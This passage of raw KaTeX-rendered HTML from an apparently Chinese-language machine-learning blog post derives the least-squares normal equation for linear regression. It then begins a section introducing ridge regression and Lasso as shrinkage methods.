class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0500050000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">m</span></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="normal">∇</mi><mi>θ</mi></msub><mi>J</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi mathvariant="normal">∇</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo stretchy="false">(</mo><mi>X</mi><mi>θ</mi><mo>−</mo><mi>y</mi><msup><mo stretchy="false">)</mo><mi>T</mi></msup><mo stretchy="false">(</mo><mi>X</mi><mi>θ</mi><mo>−</mo><mi>y</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\nabla_\theta J(\theta)=\nabla_\theta (\frac{1}{2}(X\theta-y)^T(X\theta-y))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">∇</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mord">∇</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>=</mo><msub><mi mathvariant="normal">∇</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo stretchy="false">(</mo><msup><mi>X</mi><mi>T</mi></msup><msup><mi>θ</mi><mi>T</mi></msup><mo>−</mo><msup><mi>y</mi><mi>T</mi></msup><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>X</mi><mi>θ</mi><mo>−</mo><mi>y</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">=\nabla_\theta(\frac{1}{2}(X^T\theta^T-y^T)(X\theta-y))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mord">∇</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>=</mo><msub><mi mathvariant="normal">∇</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo stretchy="false">(</mo><msup><mi>θ</mi><mi>T</mi></msup><msup><mi>X</mi><mi>T</mi></msup><mi>X</mi><mi>θ</mi><mo>−</mo><msup><mi>θ</mi><mi>T</mi></msup><msup><mi>X</mi><mi>T</mi></msup><mi>y</mi><mo>+</mo><msup><mi>y</mi><mi>T</mi></msup><mi>X</mi><mi>θ</mi><mo>−</mo><msup><mi>y</mi><mi>T</mi></msup><mi>y</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">=\nabla_\theta(\frac{1}{2}(\theta^TX^TX\theta-\theta^TX^Ty+y^TX\theta-y^Ty))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mord">∇</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0857709999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0857709999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo stretchy="false">(</mo><mn>2</mn><msup><mi>X</mi><mi>T</mi></msup><mi>X</mi><mi>θ</mi><mo>−</mo><msup><mi>X</mi><mi>T</mi></msup><mi>y</mi><mo>+</mo><mo stretchy="false">(</mo><msup><mi>y</mi><mi>T</mi></msup><mi>X</mi><msup><mo stretchy="false">)</mo><mi>T</mi></msup><mo stretchy="false">)</mo><mo>=</mo><msup><mi>X</mi><mi>T</mi></msup><mi>X</mi><mi>θ</mi><mo>−</mo><msup><mi>X</mi><mi>T</mi></msup><mi>y</mi></mrow><annotation encoding="application/x-tex">=\frac{1}{2}(2X^TX\theta-X^Ty+(y^TX)^T)=X^TX\theta-X^Ty</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord">2</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0857709999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9746609999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0857709999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>θ</mi><mo>=</mo><mo stretchy="false">(</mo><msup><mi>X</mi><mi>T</mi></msup><mi>X</mi><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><msup><mi>X</mi><mi>T</mi></msup><mi>y</mi></mrow><annotation encoding="application/x-tex">\theta=(X^TX)^{-1}X^Ty</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span></span></p><h3 id="岭回归"><a class="markdownIt-Anchor" href="#岭回归"></a> <a href="https://zhuanlan.zhihu.com/p/30535220">岭回归</a></h3><p><img src="/images/pasted-33.png" alt="回归曲线" /></p><ul><li>岭回归和Lasso是两种线性回归的缩减(shrinkage)方法。</li><li>标准最小二乘法优化问题:</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>J</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mo stretchy="false">(</mo><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>−</mo><mi>y</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">J(θ)=\frac{1}{2}\sum_{i=1}^m (h_θ(x)-y)^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t 